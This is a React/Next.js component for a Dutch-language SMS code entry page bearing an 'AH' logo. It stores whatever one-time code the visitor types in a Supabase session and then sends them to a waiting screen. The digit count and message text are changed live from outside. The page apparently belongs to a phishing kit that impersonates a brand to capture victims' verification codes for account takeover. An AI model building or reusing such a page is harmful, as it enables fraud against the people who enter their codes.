"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [digits, setDigits] = useState(6);
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-2 w-full px-4 py-3 text-lg tracking-[0.35em]",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-50",
  };

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }

      setDigits(data.sms_digits ?? 6);
      setCustomText(data.sms_custom_text);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setCode(fd.smsCode ?? "");
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as { sms_digits?: number; sms_custom_text?: string | null };
            if (next.sms_digits) {
              setDigits(next.sms_digits);
              // EÄŸer kod, yeni haneden uzunsa keselim
              setCode((prev) => prev.slice(0, next.sms_digits));
            }
            if (next.sms_custom_text !== undefined) {
              setCustomText(next.sms_custom_text);
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    setSaving(true);
    setMsg(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const { error } = await supabase
      .from("sessions")
      .update({ current_step: "wait", form_data: { ...prev, smsCode: code.trim() } })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Verzenden mislukt.");
    else router.replace(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Ongeldige link.
          </p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
        </div>
      </div>
    );
  }

  const trimmed = code.trim();
  const valid = trimmed.length === digits && /^\d+$/.test(trimmed);
  const displayText = customText || settings.sms_subtitle;

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
        
        {/* Right Top Logo Placeholder */}
        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
          <img src="/ah-logo-transparent.png" alt="AH Logo" className="h-10 w-auto" id="sms-ah-logo" />
        </div>

        <div className="mb-6 flex items-start gap-4">
          <div className="mt-1 shrink-0">
            <img src="/ah-icon-security-transparent.png" alt="Verified" className="h-12 w-12" id="sms-verified-icon" />
          </div>
          <div>
            <h2 className="text-2xl font-bold text-white mb-1">{settings.sms_title}</h2>
            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
          </div>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-5">
          <label className="block text-sm font-medium text-white">
            {settings.sms_input_label} ({digits})
            <input
              required
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={digits}
              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-xl tracking-[0.35em] text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, digits))}
            />
          </label>

          {!valid && code.length > 0 ? (
            <p className="text-xs text-red-400">Voer exact {digits} cijfers in.</p>
          ) : null}

          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

          <button
            type="submit"
            disabled={saving || !valid}
            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
          >
            {saving ? settings.sms_loading : settings.sms_button}
          </button>

          <p className="text-center text-xs text-gray-400 mt-4">
            De code is per sms naar je mobiele nummer verzonden.
          </p>
        </form>
      </div>
    </div>
  );
}
